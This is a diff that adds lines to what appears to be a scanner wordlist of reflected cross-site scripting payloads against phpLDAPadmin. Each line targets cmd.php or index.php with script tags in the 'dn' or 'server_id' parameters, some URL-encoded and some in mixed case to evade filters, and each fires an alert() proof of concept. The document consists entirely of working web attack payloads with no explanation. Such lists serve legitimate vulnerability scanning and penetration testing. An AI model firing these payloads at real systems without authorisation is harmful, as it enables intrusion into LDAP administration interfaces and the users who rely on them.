@@ -1,2 +1,10 @@
 {{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
 {{path}}/index.php?redirect=true&meth=ajax
+/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1
+/phpldapadmin/cmd.php?server_id=<script>alert(
+/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1
+/cmd.php?server_id=<script>alert(
+/phpldapadmin/index.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1
+/phpldapadmin/index.php?server_id=<script>alert(
+/index.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1
+/index.php?server_id=<script>alert(
